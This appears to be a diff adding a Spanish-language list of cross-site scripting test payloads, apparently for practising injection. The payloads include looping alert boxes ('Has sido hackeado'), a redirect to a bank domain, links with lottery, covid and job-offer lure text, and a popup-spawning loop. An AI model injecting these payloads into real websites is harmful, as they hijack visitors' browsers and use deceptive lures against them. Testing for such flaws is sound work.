@@ -1,0 +1,20 @@
+------------------------------------------------------------------------------
+<script>alert("Enhorabuena, te ha tocado la lotería!")</script>
+------------------------------------------------------------------------------
+<script>for (i=0;i<=10;i++) {alert('Eres bobo');}</script>
+------------------------------------------------------------------------------
+<script>for (i=0;i<=5;i++) {alert('Eres bobo');alert('Feliz Navidad');}for (i=0;i<=4;i++) {alert('Has sido hackeado');alert('Que Feliz Navidad!!!');}</script>
+------------------------------------------------------------------------------
+<script>window.location='https://ingdirect.es';</script>
+------------------------------------------------------------------------------
+<br><a href='https://www.mediamarkt.es/' target="_blank">haz clic para información del covid</a>
+<br><a href='https://www.conforama.es/'>haz clic si quieres ser millonario</a>
+<br><a href='http://elpais.es'>haz clic si quieres que te lean el futuro</a><br>
+<a href='https://elcorteingles.es/' target="_blank">haz clic para registrarte en la oferta de trabajo<br>
+<a href='https://pccomponentes.com/' target="_blank">haz clic para que te toque la lotería<br>
+-----------------------------------------------------------------------------
+<script>for (i=0;i<=10;i++) {window.open("https://ing.es","ventana1", "width=120,height=300,scrollbars=NO");}</script>
+-----------------------------------------------------------------------------
+
+
+-----------------------------------------------------------------------------
